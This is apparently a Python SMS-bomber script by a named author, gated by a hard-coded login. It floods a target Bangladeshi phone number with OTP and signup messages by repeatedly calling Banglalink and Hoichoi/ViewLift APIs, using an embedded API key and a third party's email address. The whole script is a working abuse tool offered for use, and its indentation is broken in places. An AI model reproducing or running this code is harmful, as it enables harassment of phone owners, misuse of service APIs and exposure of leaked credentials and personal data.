
import os
import requests
import time
from requests.structures import CaseInsensitiveDict

#CVALUE
blue= '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan  = "\033[96m"
end = '\033[0m'
purple="\033[0;35m"
os.system('clear')
line=yellow+"===================="+purple+"===================="+red+"===================="+purple+"===================="+yellow+"===================="+yellow+"===================="+purple+"===================="+red+"===================="+purple+"===================="+yellow+"===================="
space=" "
logo=yellow+str("""
          
                       
   ╔═════════════════════════════════╗
   ║ Author.  : TaNviR-AhMeD-RiYaD   ║
   ║ Facebook : MrTaNviiR            ║
   ║ GitHub   : TaNviiR-RiiYaD       ║
   ╚═════════════════════════════════╝
       
 
  
  
""")

      
 #HEADER                
text=lightblue+"\t\tCreated By : "+yellow+"TaNviiR AhMeD"+cyan+"\n\n\t\t★★ "+purple+" CraZy DeveLoper"+cyan+" ★★   \n" 
notice=""     
def header():
	print(logo)
	print(text)
	print(line)
	print(notice)

#SECURITY				
header()
print("---------------------------------------")
print("Your need to Login Befor Use The Tools")
print("---------------------------------------")
n=2
while n==2:
		a=str(input(cyan+"\n\n\t\t[>] Username : "+green))
		b=str(input(cyan+"\n\n\t\t[>] Password : "+green))
		if a=="Action" and b=="Team":
			print(green+"\n\n\t\t[ √ ] Accepted")
			n=3
		else:
			
			print(red+"\n\n\t\t[ × ] Rejected Try Again")
			n=2
			
			os.system('clear')
			header()


#MAIN_TOOL
os.system('clear')
tt=1
header()	
while tt<2:
		os.system('clear')
		header()
		number=str(input(lightblue+"\n\n\t [>] Enter Your Target Number :88"+lightblue))
		ammount=int(input(lightblue+"\n\t [>] Enter The Ammount : "+lightblue))
		os.system('clear')
		notice=cyan+"\n\t\t\t   [•] Tools iS running......\n\n"
		header()
		ammount2=1
		totalsent=0
		totalnotsent=0
		while ammount2<ammount+1:
			try:
				if "yy" in number or "yyy" in number:
					r=requests.post("https://assetliteapi.banglalink.net/api/v1/user/otp-login/request",data={"mobile":number})
						
				else:                                        url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"
					headers=CaseInsensitiveDict()
					headers["Host"] = "prod-api.viewlift.com"
					headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0"
					headers["Accept"] = "application/json, text/plain, */*"
					headers["Accept-Language"] = "en-US,en;q=0.5"
					headers["Accept-Encoding"] = "gzip, deflate, br"
					headers["Content-Type"] = "application/json"
					headers["Content-Length"] = "128"
					headers["x-api-key"] = "dtGKRIAd7y3mwmuXGk63u3MI3Azl1iYX8w9kaeg3"
					headers["Origin"] = "https://www.hoichoi.tv"
					headers["Referer"] = "https://www.hoichoi.tv/"
					headers["Connection"] = "keep-alive"
					data = """{\"requestType\":\"send\",\"phoneNumber\":\"+88"""+number+"""\",\"emailConsent\":true,\"whatsappConsent\":true,\"email\":\"sanaur.asif@gmail.com\"}"""
		                        r= requests.post(url, headers=headers, data=data)


                                if ammount2==1:
					print(purple+"\n\t\t  ★★TaNviiR★★==>   "+green+"[✓] 1st SMS Sent.")
				elif ammount2==2:
					print(purple+"\n\t\t  ★★TaNviiR★★==>   "+green+"[✓] 2nd SMS Sent.")
				elif ammount2==3:
					print(purple+"\n\t\t  ★★TaNviiR★★==>   "+green+"[✓] 3rd SMS Sent.")
				else:
					print(purple+"\n\t\t  ★★TaNviiR★★==>   "+green+"[✓] "+str(ammount2)+"th SMS Sent.")
				time.sleep(0.00000000000000000000000000001)
				totalsent+=1
				ammount2+=1
			except:
				if ammount2==1:
					print(cyan+"\n\t\t  ★★TaNviiR★★==>   "+red+"[×] 1st SMS Not Sent.")
				elif ammount2==2:
					print(cyan+"\n\t\t  ★★TaNviiR★★==>   "+red+"[×] 2nd SMS Not Sent.")
				elif ammount2==3:
					print(cyan+"\n\t\t  ★★TaNviiR★★==>   "+red+"[×] 3rd SMS Not Sent.")
				else:
					print(cyan+"\n\t\t  ★★TaNviiR★★==>   "+red+"[×] "+str(ammount2)+"th SMS Not Sent.")
					time.sleep(0.000000001)
					ammount2+=1
									
								
		totalhit=ammount2-1
		totalnotsent=totalhit-totalsent
		print(purple+"\n\n\t\t[•] Total Hits : "+yellow+str(totalhit))
		print(green+"\n\t\t[✓] Total Sent : "+yellow+str(totalsent))
		print(red+"\n\t\t[×] Total Not Sent : "+yellow+str(totalnotsent)+"\n")
		lastt=str(input(purple+"\n\n\t\t  [✓] All Done!\n\t [•] Now Press Enter Key To Continue:\n"))
		count=1
	
